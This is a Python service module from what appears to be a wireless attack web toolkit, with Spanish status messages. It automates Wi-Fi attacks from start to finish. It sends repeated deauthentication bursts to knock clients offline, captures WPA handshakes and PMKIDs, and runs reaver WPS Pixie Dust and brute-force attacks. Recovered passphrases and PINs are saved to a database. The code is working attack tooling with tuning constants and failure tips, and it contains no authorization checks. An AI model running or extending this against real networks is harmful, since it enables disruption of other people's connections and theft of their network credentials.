import asyncio
import os
import uuid
import logging
from collections.abc import AsyncIterator
from datetime import datetime, timezone

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.config import settings
from app.models.handshake import Handshake
from app.models.network import Network
from app.models.credential import Credential
from app.process.manager import process_manager
from app.tools.aireplay import AireplayTool
from app.tools.airodump import AirodumpTool
from app.tools.aircrack import AircrackTool
from app.tools.hcxtools import HcxTool
from app.tools.reaver import ReaverTool

logger = logging.getLogger(__name__)

_aireplay = AireplayTool()
_airodump = AirodumpTool()
_aircrack = AircrackTool()
_hcxtools = HcxTool()
_reaver = ReaverTool()

# ── Constants for attack tuning ──────────────────────────────────────────────
DEAUTH_INTERVAL      = 20   # Seconds between deauth re-bursts within an attempt
DEAUTH_COUNT_PER_BURST = 64 # Packets per burst — enough to force client disconnect
HANDSHAKE_POLL_INTERVAL = 3 # Seconds between handshake verification checks
WPS_TIMEOUT_DEFAULT   = 300 # 5 minutes max for WPS attacks
MAX_DEAUTH_ROUNDS     = 8   # Max re-deauth rounds per attempt


class AttackerService:
    """Orchestrates the execution of wireless attacks."""

    def _work_path(self, *parts: str) -> str:
        """Return a path inside WORK_DIR, creating parent dirs as needed."""
        path = os.path.join(settings.work_dir, *parts)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        return path

    async def _resolve_network_id(self, db: AsyncSession, bssid: str) -> int | None:
        """Look up the network_id for a given BSSID. Returns None if not found."""
        result = await db.execute(
            select(Network.id).where(Network.bssid == bssid.upper())
        )
        return result.scalar_one_or_none()

    async def _upsert_network(self, db: AsyncSession, bssid: str) -> int:
        """Return the network_id for bssid, inserting a minimal row if missing.

        Avoids the FK violation that occurred when network_id was set to 0.
        """
        nid = await self._resolve_network_id(db, bssid)
        if nid is None:
            net = Network(bssid=bssid.upper())
            db.add(net)
            await db.flush()  # populate net.id without committing yet
            nid = net.id
        return nid

    async def _verify_tools(self, *tools: str) -> list[str]:
        """Check if required tools are available. Returns list of missing tools."""
        missing = []
        tool_map = {
            "airodump-ng": _airodump,
            "aireplay-ng": _aireplay,
            "aircrack-ng": _aircrack,
            "reaver": _reaver,
            "hcxdumptool": _hcxtools,
        }
        for tool in tools:
            wrapper = tool_map.get(tool)
            if wrapper and not wrapper.is_available():
                missing.append(tool)
        return missing

    async def _send_deauth_burst(
        self,
        interface: str,
        bssid: str,
        client_mac: str | None,
        count: int,
        attack_id: str,
    ) -> AsyncIterator[dict]:
        """Send a burst of deauth packets and yield output events."""
        deauth_proc = await asyncio.create_subprocess_exec(
            "aireplay-ng",
            "-0", str(count),
            "-a", bssid,
            *(["-c", client_mac] if client_mac else []),
            interface,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        deauth_id = f"{attack_id}_deauth_{uuid.uuid4().hex[:4]}"
        process_manager.register(deauth_id, deauth_proc, "deauth", bssid)

        try:
            assert deauth_proc.stdout is not None
            async for raw in deauth_proc.stdout:
                line = raw.decode(errors="replace").strip()
                if line:
                    yield {"type": "output", "message": line, "tool": "aireplay-ng"}
            await asyncio.wait_for(deauth_proc.wait(), timeout=30)
        except asyncio.TimeoutError:
            logger.warning(f"Deauth process timed out for {bssid}")
            try:
                deauth_proc.terminate()
            except ProcessLookupError:
                pass
        finally:
            process_manager.mark_done(deauth_id)

    # ──────────────────────────────────────────────────────────────────────────
    # WPA Handshake capture (improved with periodic deauth)
    # ──────────────────────────────────────────────────────────────────────────

    async def capture_handshake(
        self,
        db: AsyncSession,
        interface: str,
        bssid: str,
        channel: int,
        client_mac: str | None = None,
        deauth_count: int = DEAUTH_COUNT_PER_BURST,
        timeout: int = 300,
        max_retries: int = 5,
    ) -> AsyncIterator[dict]:
        """Capture a WPA handshake and yield WSEvent dicts.

        Retries up to *max_retries* times.  Each attempt:
        - Starts a fresh airodump-ng session (with --write-interval 1)
        - Sends an initial deauth burst, then re-bursts every DEAUTH_INTERVAL s
        - Reports diagnostic reasons on failure
        """
        # Verify required tools
        missing = await self._verify_tools("airodump-ng", "aireplay-ng", "aircrack-ng")
        if missing:
            yield {"type": "error", "message": f"Herramientas no encontradas: {', '.join(missing)}"}
            return

        attack_id  = str(uuid.uuid4())
        safe_bssid = bssid.replace(":", "")
        cap_base   = os.path.join(settings.work_dir, f"hs_{safe_bssid}_{attack_id[:8]}")
        os.makedirs(cap_base, exist_ok=True)

        per_attempt   = max(30, timeout // max_retries)
        handshake_found = False

        yield {
            "type": "start",
            "message": f"Iniciando captura WPA para {bssid} (máx {max_retries} intentos)",
            "tool": "airodump-ng",
        }

        for attempt in range(1, max_retries + 1):
            yield {
                "type": "step",
                "message": f"[{attempt}/{max_retries}] Iniciando captura WPA para {bssid}",
                "attempt": attempt,
                "max_retries": max_retries,
            }

            cap_dir       = os.path.join(cap_base, f"attempt_{attempt}")
            os.makedirs(cap_dir, exist_ok=True)
            output_prefix = os.path.join(cap_dir, "cap")
            cap_file      = f"{output_prefix}-01.cap"
            log_path      = os.path.join(cap_dir, "airodump.log")

            # ── Launch airodump-ng ────────────────────────────────────────────
            try:
                airodump_log = open(log_path, "w")  # noqa: WPS515
                capture_proc = await asyncio.create_subprocess_exec(
                    "airodump-ng",
                    "-c", str(channel),
                    "--bssid", bssid,
                    "-w", output_prefix,
                    "--output-format", "cap",
                    "--write-interval", "1",       # flush cap to disk every second
                    "--ignore-negative-one",       # suppress fixed-channel noise
                    interface,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=airodump_log,
                )
            except Exception as e:
                logger.error(f"Failed to start airodump-ng: {e}")
                yield {"type": "error", "message": f"Error al iniciar airodump-ng: {e}"}
                return

            cap_attack_id = f"{attack_id}_cap_{attempt}"
            process_manager.register(cap_attack_id, capture_proc, "wpa_handshake", bssid)
            await asyncio.sleep(2)

            if capture_proc.returncode is not None:
                airodump_log.close()
                process_manager.mark_done(cap_attack_id)
                yield {
                    "type": "error",
                    "message": "airodump-ng terminó de inmediato — verifica modo monitor (airmon-ng start wlanX).",
                }
                return

            start_time    = asyncio.get_event_loop().time()
            deadline      = start_time + per_attempt
            last_deauth_t = 0.0
            deauth_round  = 0

            yield {"type": "step", "message": f"Captura activa (intento {attempt}/{max_retries}, {per_attempt}s)..."}

            try:
                while asyncio.get_event_loop().time() < deadline:
                    now = asyncio.get_event_loop().time()

                    # Periodic deauth bursts
                    if now - last_deauth_t >= DEAUTH_INTERVAL and deauth_round < MAX_DEAUTH_ROUNDS:
                        deauth_round += 1
                        yield {
                            "type": "step",
                            "message": f"Deauth burst #{deauth_round} ({deauth_count} paquetes)...",
                            "tool": "aireplay-ng",
                        }
                        async for event in self._send_deauth_burst(
                            interface, bssid, client_mac, deauth_count, attack_id
                        ):
                            yield event
                        last_deauth_t = asyncio.get_event_loop().time()

                    await asyncio.sleep(HANDSHAKE_POLL_INTERVAL)

                    if os.path.exists(cap_file):
                        try:
                            ok, _ = await _aircrack.verify_handshake(cap_file, bssid)
                            if ok:
                                handshake_found = True
                                network_id = await self._upsert_network(db, bssid)
                                hs = Handshake(
                                    network_id=network_id,
                                    file_path=cap_file,
                                    file_type="cap",
                                    verified=True,
                                    captured_at=datetime.now(timezone.utc),
                                )
                                db.add(hs)
                                await db.commit()
                                await db.refresh(hs)
                                yield {
                                    "type": "handshake",
                                    "message": f"✓ Handshake capturado (intento {attempt}/{max_retries})",
                                    "data": {"file": cap_file, "bssid": bssid, "handshake_id": hs.id},
                                }
                                break
                        except Exception as e:
                            logger.warning(f"Error verifying handshake: {e}")

                    elapsed   = int(now - start_time)
                    remaining = max(0, int(deadline - now))
                    yield {
                        "type": "progress",
                        "message": f"Esperando handshake... {remaining}s (intento {attempt}/{max_retries}, deauth #{deauth_round})",
                        "progress": int(elapsed / per_attempt * 100),
                    }

            except asyncio.CancelledError:
                logger.info(f"Handshake capture cancelled for {bssid}")
                yield {"type": "warning", "message": "Captura cancelada por el usuario."}
                return
            finally:
                try:
                    capture_proc.terminate()
                    await asyncio.wait_for(capture_proc.wait(), timeout=5)
                except (ProcessLookupError, asyncio.TimeoutError):
                    try:
                        capture_proc.kill()
                    except ProcessLookupError:
                        pass
                finally:
                    airodump_log.close()
                process_manager.mark_done(cap_attack_id)

            if handshake_found:
                break

            # ── Diagnose why this attempt failed ─────────────────────────────
            reasons: list[str] = []
            if not os.path.exists(cap_file):
                reasons.append(
                    "no se creó el cap file — verifica modo monitor (airmon-ng start wlanX)"
                )
            else:
                size = os.path.getsize(cap_file)
                if size < 200:
                    reasons.append(
                        f"cap file muy pequeño ({size}B) — sin clientes o sin tráfico management"
                    )
                else:
                    reasons.append(
                        f"tráfico capturado ({size // 1024}KB) pero sin 4-way handshake "
                        "— los clientes no se reconectaron"
                    )
            if os.path.exists(log_path):
                with open(log_path) as fh:
                    log_tail = fh.read()[-800:]
                if "No such device" in log_tail:
                    reasons.insert(0, "interfaz no encontrada")
                elif "fixed channel" in log_tail.lower():
                    reasons.append("canal fijado — prueba sin especificar canal")

            diagnostic = "; ".join(reasons) if reasons else "razón desconocida"
            yield {
                "type": "warning",
                "message": f"✗ Intento {attempt}/{max_retries} sin éxito — {diagnostic}",
            }
            if attempt < max_retries:
                yield {"type": "step", "message": f"Reintentando en 3s... ({attempt + 1}/{max_retries})"}
                await asyncio.sleep(3)

        if handshake_found:
            yield {"type": "done", "message": "Captura completada. Usa /api/attacks/crack para crackear."}
        else:
            yield {
                "type": "error",
                "message": (
                    f"No se capturó handshake en {max_retries} intentos para {bssid}. "
                    "Consejos: 1) Asegúrate de que haya clientes activos. "
                    "2) Modo monitor correcto (airmon-ng start wlanX). "
                    "3) Canal correcto y proximidad al AP. "
                    "4) Intenta con cliente objetivo (-c MAC)."
                ),
            }

    # ──────────────────────────────────────────────────────────────────────────
    # WPS attack (improved with timeout and rate-limit detection)
    # ──────────────────────────────────────────────────────────────────────────

    async def attack_wps(
        self,
        db: AsyncSession,
        interface: str,
        bssid: str,
        channel: int,
        mode: str = "pixie",
        timeout: int = WPS_TIMEOUT_DEFAULT,
    ) -> AsyncIterator[dict]:
        """Run a WPS attack (Pixie Dust or brute-force) and yield WSEvents.

        Improved version with:
        - Timeout protection
        - Rate-limit detection
        - Process registration for cancellation
        """
        # Verify reaver is available
        missing = await self._verify_tools("reaver")
        if missing:
            yield {"type": "error", "message": "reaver no está instalado."}
            return

        attack_id = str(uuid.uuid4())
        yield {"type": "start", "message": f"Iniciando ataque WPS ({mode}) contra {bssid}", "tool": "reaver"}

        # Build reaver command
        args = [
            "-i", interface,
            "-b", bssid,
            "-c", str(channel),
            "-vv",
        ]
        if mode == "pixie":
            args.append("-K")  # Pixie Dust
        else:
            args.extend(["-d", "2", "-L", "-N"])  # Brute-force with delay

        try:
            proc = await asyncio.create_subprocess_exec(
                "reaver",
                *args,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
        except Exception as e:
            logger.error(f"Failed to start reaver: {e}")
            yield {"type": "error", "message": f"Error al iniciar reaver: {e}"}
            return

        process_manager.register(attack_id, proc, f"wps_{mode}", bssid)

        output_buffer: list[str] = []
        rate_limited = False
        start_time = asyncio.get_event_loop().time()

        try:
            assert proc.stdout is not None

            async def read_output():
                nonlocal rate_limited
                async for raw in proc.stdout:
                    line = raw.decode(errors="replace").strip()
                    if line:
                        output_buffer.append(line)
                        yield line
                        # Detect rate limiting
                        if "WARNING" in line and ("rate" in line.lower() or "limit" in line.lower()):
                            rate_limited = True

            async for line in read_output():
                yield {"type": "output", "message": line, "tool": "reaver"}

                # Check timeout
                if asyncio.get_event_loop().time() - start_time > timeout:
                    logger.warning(f"WPS attack timed out for {bssid}")
                    proc.terminate()
                    yield {"type": "warning", "message": f"Timeout alcanzado ({timeout}s). Terminando ataque."}
                    break

            await asyncio.wait_for(proc.wait(), timeout=10)

        except asyncio.TimeoutError:
            try:
                proc.kill()
            except ProcessLookupError:
                pass
            yield {"type": "warning", "message": "Proceso terminado forzosamente."}
        except asyncio.CancelledError:
            try:
                proc.terminate()
            except ProcessLookupError:
                pass
            yield {"type": "warning", "message": "Ataque cancelado."}
        finally:
            process_manager.mark_done(attack_id)

        full_output = "\n".join(output_buffer)
        result = _reaver.parse_result(full_output)

        if result:
            network_id = await self._upsert_network(db, bssid)
            cred = Credential(
                network_id=network_id,
                password=result["psk"],
                wps_pin=result.get("pin"),
                attack_type=f"wps_{mode}",
                cracked_by="reaver",
                found_at=datetime.now(timezone.utc),
            )
            db.add(cred)
            await db.commit()
            await db.refresh(cred)

            yield {
                "type": "credential",
                "message": f"Credenciales encontradas para {bssid}",
                "data": {**result, "credential_id": cred.id},
            }
            yield {"type": "done", "message": "Ataque WPS completado exitosamente."}
        else:
            # Use reaver's detection methods for better error messages
            error_msg = "No se encontraron credenciales WPS."
            if _reaver.is_locked(full_output):
                error_msg = "El AP tiene WPS bloqueado. No es posible continuar el ataque."
            elif _reaver.is_rate_limited(full_output) or rate_limited:
                error_msg = "El AP detectó el ataque y aplicó rate-limiting. Espera unos minutos antes de intentar de nuevo."
            yield {"type": "error", "message": error_msg}

    # ──────────────────────────────────────────────────────────────────────────
    # PMKID capture (improved with DB persistence)
    # ──────────────────────────────────────────────────────────────────────────

    async def capture_pmkid(
        self,
        db: AsyncSession,
        interface: str,
        bssid: str | None = None,
        timeout: int = 120,
    ) -> AsyncIterator[dict]:
        """Capture PMKID hashes using hcxdumptool and yield WSEvents.

        Improved version with:
        - Tool verification
        - DB persistence of captured PMKID
        - Better output parsing
        """
        # Verify tool availability
        missing = await self._verify_tools("hcxdumptool")
        if missing:
            yield {"type": "error", "message": "hcxdumptool no está instalado."}
            return

        attack_id = str(uuid.uuid4())
        safe_bssid = (bssid or "all").replace(":", "")
        cap_dir = os.path.join(settings.work_dir, f"pmkid_{safe_bssid}_{attack_id[:8]}")
        os.makedirs(cap_dir, exist_ok=True)
        output_file = os.path.join(cap_dir, "capture.pcapng")

        yield {"type": "start", "message": "Iniciando captura PMKID con hcxdumptool", "tool": "hcxdumptool"}

        pmkid_found = False
        pmkid_bssids: set[str] = set()

        try:
            async for line in _hcxtools.capture_pmkid(interface, output_file, bssid, timeout):
                yield {"type": "output", "message": line, "tool": "hcxdumptool"}

                if _hcxtools.has_pmkid(line):
                    pmkid_found = True
                    # Try to extract BSSID from output
                    if bssid:
                        pmkid_bssids.add(bssid.upper())

                    yield {
                        "type": "handshake",
                        "message": "PMKID capturado — listo para convertir y crackear",
                        "data": {"pcapng_file": output_file, "bssid": bssid},
                    }

        except asyncio.CancelledError:
            yield {"type": "warning", "message": "Captura PMKID cancelada."}

        # Persist to DB if PMKID was found
        if pmkid_found and os.path.exists(output_file):
            for captured_bssid in pmkid_bssids or ([bssid] if bssid else []):
                if not captured_bssid:
                    continue
                network_id = await self._upsert_network(db, captured_bssid)
                hs = Handshake(
                    network_id=network_id,
                    file_path=output_file,
                    file_type="pcapng",
                    verified=True,
                    captured_at=datetime.now(timezone.utc),
                )
                db.add(hs)

            await db.commit()
            yield {"type": "done", "message": f"Captura PMKID completada: {output_file}"}
        else:
            yield {"type": "error", "message": "No se capturó ningún PMKID en el tiempo límite."}


attacker_service = AttackerService()
